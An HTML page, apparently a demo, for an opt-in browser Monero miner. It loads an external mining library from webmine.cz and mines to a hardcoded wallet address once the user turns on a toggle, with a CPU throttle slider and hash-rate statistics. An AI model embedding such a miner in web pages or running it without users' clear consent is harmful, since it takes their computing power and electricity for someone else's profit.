<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educational Monero Miner (v2 - Repaired)</title>
    <style>
        :root { --bg-color: #1a1a1a; --card-color: #2c2c2c; --text-color: #e1e1e1; --primary-color: #00b8d4; --border-color: #444; }
        body { font-family: system-ui, sans-serif; line-height: 1.6; margin: 0; padding: 24px; background-color: var(--bg-color); color: var(--text-color); }
        .container { max-width: 800px; margin: auto; display: flex; flex-direction: column; gap: 24px; }
        .card { background: var(--card-color); padding: 20px; border-radius: 12px; border: 1px solid var(--border-color); }
        h1, h2 { border-bottom: 2px solid var(--primary-color); padding-bottom: 8px; margin-top: 0; }
        .control-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0;}
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
        .stat-item { background: var(--bg-color); padding: 16px; border-radius: 8px; text-align: center; }
        .stat-item h3 { margin: 0 0 8px 0; font-size: 0.9em; color: #aaa; text-transform: uppercase; }
        .stat-value { font-size: 1.75em; font-weight: bold; color: var(--primary-color); }
        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 28px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .toggle-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #555; transition: .4s; border-radius: 28px; }
        .toggle-slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .toggle-slider { background-color: var(--primary-color); }
        input:checked + .toggle-slider:before { transform: translateX(22px); }
    </style>
</head>
<body>
    <div class="container">
        <div class="card"><h1>Educational Miner v2 (Repaired)</h1></div>
        <div class="card">
            <h2>Controls</h2>
            <div class="control-item">
                <span>Status: <strong id="status-display">Idle</strong></span>
                <label class="toggle-switch"><input type="checkbox" id="mining-toggle"><span class="toggle-slider"></span></label>
            </div>
            <div class="control-item">
                <span>CPU Usage (<span id="cpu-value">10%</span>)</span>
                <input type="range" min="1" max="100" value="10" id="cpu-slider" style="width: 50%;" disabled>
            </div>
        </div>
        <div class="card">
            <h2>Live Statistics</h2>
            <div class="stats-grid">
                <div class="stat-item"><h3>Hash Rate</h3><span class="stat-value" id="hash-rate">0 H/s</span></div>
                <div class="stat-item"><h3>Total Hashes</h3><span class="stat-value" id="total-hashes">0</span></div>
            </div>
        </div>
    </div>

    <script src="https://webmine.cz/lib/base.js"></script>
    <script>
        const walletAddress = "48TjjUjavn7fjTQTj9uUwwf2WXQD55MRYebih88G4VnTUPy8ivTEwKJFHZx5DREWWF5QZXkUqYbFq6Uvnq7iw7mHC4seyxZ";
        let miner = null;

        const miningToggle = document.getElementById('mining-toggle');
        const cpuSlider = document.getElementById('cpu-slider');
        const cpuValue = document.getElementById('cpu-value');
        const statusDisplay = document.getElementById('status-display');
        const hashRateDisplay = document.getElementById('hash-rate');
        const totalHashesDisplay = document.getElementById('total-hashes');

        function setStatus(text, color) {
            statusDisplay.innerText = text;
            statusDisplay.style.color = color;
        }

        async function startMining() {
            setStatus('Starting...', '#ffc107');
            miner = await Client.Anonymous(walletAddress, {
                throttle: 1 - (cpuSlider.value / 100)
            });
            await miner.start();
            cpuSlider.disabled = false;
            setStatus('Mining', '#4caf50');

            miner.on('update', data => {
                hashRateDisplay.innerText = `${data.hashesPerSecond.toFixed(1)} H/s`;
                totalHashesDisplay.innerText = data.totalHashes;
            });
        }

        function stopMining() {
            if (miner) {
                miner.stop();
                miner = null;
            }
            cpuSlider.disabled = true;
            setStatus('Idle', '#e1e1e1');
            hashRateDisplay.innerText = '0 H/s';
        }

        miningToggle.addEventListener('change', () => {
            if (miningToggle.checked) {
                startMining();
            } else {
                stopMining();
            }
        });

        cpuSlider.addEventListener('input', () => {
            const newThrottle = 1 - (cpuSlider.value / 100);
            cpuValue.innerText = `${cpuSlider.value}%`;
            if (miner) {
                miner.setThrottle(newThrottle);
            }
        });
    </script>
</body>
</html>
